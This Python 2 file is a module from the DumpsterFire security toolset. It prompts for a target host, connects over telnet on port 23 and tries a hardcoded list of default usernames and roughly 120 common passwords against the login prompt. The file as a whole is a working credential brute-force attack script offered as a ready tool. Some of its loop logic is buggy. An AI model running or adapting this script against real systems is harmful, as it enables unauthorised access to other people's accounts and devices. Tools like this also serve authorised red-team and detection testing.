#!/usr/bin/python
#
# Filename:  telnet_top_100_defaults.py
#
# Version: 1.0.0
#
# Author:  Joe Gervais (TryCatchHCF)
#
# Summary:
#
#	Part of the DumpsterFire Toolset. See documentation at https://github.com/TryCatchHCF/DumpsterFire
#
# Description:
#
#

import os, sys, telnetlib, datetime


from FireModules.fire_module_base_class import *

class telnet_top_100_defaults( FireModule ):

	def __init__(self):
		self.commentsStr = "AccountBruting/telnet_top_100_defaults"

	def __init__(self, moofStr):
		self.moofStr = moofStr
		self.commentsStr = "AccountBruting/telnet_top_100_defaults"
		return;

	def Description( self ):
		self.Description = "Launches telnet bruteforce against target system, using common users/passwords"
		return self.Description

        def Configure( self ):
                self.networkAddrStr = raw_input( "Enter target address (W.X.Y.Z) or domain: " )
                return

        def GetParameters( self ):
                return( self.networkAddrStr )

        def SetParameters( self, parametersStr ):
                self.networkAddrStr = parametersStr
                return

        def ActivateLogging( self, logFlag ):
                print self.commentsStr + ": Setting Logging flag!"
                print logFlag
                return

        def Ignite( self ):

		if ( self.networkAddrStr == "" ):
			print "## ", self.commentsStr, ": Error - Network address string is blank"
			return
		else:

			self.mCurrentDateTimeUTC = datetime.datetime.utcnow()

			print "UTC", self.mCurrentDateTimeUTC.strftime("%x %X"), "- Attempting telnet connection to:", self.networkAddrStr

			try:
				# Set timeout to 3 seconds so we don't stall out
				telnetSession = telnetlib.Telnet( self.networkAddrStr, 23, 3 )
	
				print "Telnet session established to host:", self.networkAddrStr

				i = 0
				m = 0

				# If we got a telnet session, time to bruteforce some creds

				while i < len( telnetUsernames ):
					while m < len( telnetPasswords ):

						telnetSession.read_until( "login: " )
						telnetSession.write( telnetUsernames[ i ] + "\n" )
			
						telnetSession.read_until( "Password: " )
						telnetSession.write( telnetPasswords[ m ] + "\n" )
	
						m = m + 1
					i = i + 1
			except:
				print "Could not establish telnet connection"

		return

	# Declare these lists down here so they don't clutter up the methods
	telnetUsernames = [ "admin", "root", "test", "telnet" ]
	telnetPasswords = [ "admin", \
			"administrator", \
			"root", \
			"test", \
			"telnet", \
			"toor", \
			"password", \
			"password1", \
			"Passw@rd", \
			"000000", \
			"111111", \
			"123123", \
			"1234", \
			"12345", \
			"123456", \
			"1234567", \
			"12345678", \
			"123456789", \
			"1234567890", \
			"654321", \
			"666666", \
			"987654321", \
			"abc123", \
			"amanda", \
			"andrea", \
			"andrew", \
			"angel", \
			"angels", \
			"anthony", \
			"ashley", \
			"babygirl", \
			"barbie", \
			"baseball", \
			"basketball", \
			"brandon", \
			"bubbles", \
			"butterfly", \
			"carlos", \
			"charlie", \
			"chelsea", \
			"chocolate", \
			"computer", \
			"cookie", \
			"daniel", \
			"danielle", \
			"dev", \
			"dragon", \
			"elizabeth", \
			"eminem", \
			"family", \
			"flower", \
			"footbal", \
			"football", \
			"forever", \
			"friends", \
			"fuckyou", \
			"hannah", \
			"hello", \
			"hottie", \
			"iloveu", \
			"iloveyou", \
			"jasmine", \
			"jennifer", \
			"jessica", \
			"jesus", \
			"jonathan", \
			"jordan", \
			"joseph", \
			"joshua", \
			"junior", \
			"justin", \
			"letmein", \
			"liverpool", \
			"logon", \
			"lovely", \
			"loveme", \
			"lovers", \
			"loveyou", \
			"maintaince", \
			"marketing", \
			"master", \
			"matthew", \
			"melissa", \
			"michael", \
			"michelle", \
			"monkey", \
			"mustang", \
			"naruto", \
			"nicole", \
			"ninja", \
			"playboy", \
			"pretty", \
			"princess", \
			"purple", \
			"querty", \
			"qwerty", \
			"raspberry", \
			"robert", \
			"samantha", \
			"secret", \
			"shadow", \
			"soccer", \
			"spongebob", \
			"summer", \
			"sunshine", \
			"superman", \
			"sweety", \
			"teamo", \
			"techsupport", \
			"tigger", \
			"tinkerbell", \
			"trustno1", \
			"tweety", \
			"uploader", \
			"vanessa", \
			"webadmin", \
			"webmaster", \
			"welcome", \
			"whatever" ]
